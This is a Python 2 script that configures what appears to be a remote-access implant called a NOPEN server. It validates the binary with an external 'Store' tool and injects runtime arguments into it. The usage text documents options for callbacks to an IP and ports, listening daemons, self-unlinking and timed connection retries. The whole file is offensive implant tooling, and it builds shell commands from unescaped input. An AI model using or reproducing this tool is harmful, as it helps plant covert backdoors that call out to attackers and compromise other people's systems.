#!/usr/bin/env python
version = '2.0.0.2'

import os
import re
import sys
import shutil
import os.path
import subprocess

VAR_NAME = 'D'

def execute(cmd, printit=False):
    
    if printit:
        print 'executing: [%s]' % cmd

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
    output = proc.stdout.read()

    return output


def parse_output(output):

    ret_lines = []

    if output.__class__() != []:
        output = output.split('\n')

    for line in output:
        if re.match('^\[\#\] (Name|Value):.*$', line) or \
           re.match('^    0x.*$', line):
            ret_lines.append(line)

    return '\n'.join(ret_lines)


def usage():

    print ''
    print 'usage: %s infile [outfile] [NOPEN-args]' % os.path.basename(sys.argv[0])
    print ''
    print 'outfile defaults to infile.new. If provided, outfile must not start'
    print 'with a "-" or contain whitespace.'
    print ''
    print 'If "ZERO" is given as the NOPEN-args argument, the argument buffer'
    print 'in infile is zeroed out.'
    print ''
    print 'If no NOPEN-args argument is given, the argument buffer in infile is'
    print 'found and shown.'
    print ''
    print 'The NOPEN-args provided are injected into infile if it is a valid'
    print 'NOPEN server (i.e., has the right head/tail tags in it). Valid NOPEN'
    print 'arguments include the same that can be provided to NOPEN server via the'
    print '$D environment variable, namely:'
    print ''
    print ' -I                stdin mode'
    print ' -i                do not autokill after 5 hours'
    print ' -u                unlink binary if possible'
    print ' -S##              sleep ## seconds before connecting'
    print ' -CIP:P1|P2|P3     callback to IP, trying multiple ports in succession'
    print ' -T##              tcp timeout if cannot connect via callback [30s]'
    print ' -r##              number of retries'
    print ' -P##              pause between connect attempts'
    print ' -cIP:PORT         callback to IP:PORT'
    print ' -lPORT            start daemon listening on PORT'
    print ' -LIP              specify the IP or listen on (default 0.0.0.0)'
    print ''
    print 'Every argument requires its own "-", preceeded by a single space (so'
    print '"-iIS15" is NOT legal). Avoid whitespace within argument values as'
    print 'shown above--i.e. use "-l32323" rather than "-l 32323".'
    print ''
    print 'NOTE: "Store" binary must be present in $PATH\n'
    print '%s version %s' % (os.path.basename(sys.argv[0]), version)

    sys.exit(1)


def main():

    infile = None
    outfile = None
    nopenargs = None
    argsidx = 0
    dostore = 0

    if len(sys.argv) < 2:
        usage()

    infile = sys.argv[1]

    if len(sys.argv) > 2:
        dostore = 1
        if sys.argv[2][0] != '-':
            outfile = sys.argv[2]
            argsidx = 3
        else:
            outfile = '%s.new' % infile
            argsidx = 2

        if os.path.exists(outfile) and not os.path.isfile(outfile):
            print 'ERROR: "%s" is not a file' % outfile
            sys.exit(1)

    if not os.path.exists(infile):
        print 'ERROR: "%s" does not exist' % infile
        sys.exit(1)

    if len(sys.argv) > 2 and argsidx <= len(sys.argv):
        nopenargs = ' '.join(sys.argv[argsidx:])
        dostore = 1

    # check that infile is a valid noserver
    output = execute('Store --file="%s" --get="svr"' % infile)
    if parse_output(output) == '':
        print 'ERROR: "%s" not a valid noserver' % infile
        sys.exit(1)

    print 'File "%s" is a valid noserver' % infile

    if dostore:
        print '\nASCII arguments to store are between double colons:'
        print '::%s::\n' % nopenargs
        shutil.copy(infile, outfile)
        storestr = 'echo -n "%s" | Store --nullterminate --file="%s" --set="%s" --get="%s"' % \
            (nopenargs, outfile, VAR_NAME, VAR_NAME)
        output = execute(storestr, True)
    else:
        output = execute('Store --file="%s" --get="%s"' % (infile, VAR_NAME))

    value = parse_output(output)
    if value != '':
        print '\nFound variable %s:' % VAR_NAME
        print value

    files = infile
    if outfile != None:
        files = '%s %s' % (files, outfile)

    print '\nlisting:'
    print execute('ls -l %s' % files)

    print 'sha1sums:'
    print execute('sha1sum %s' % files)


if __name__ == '__main__':
    main()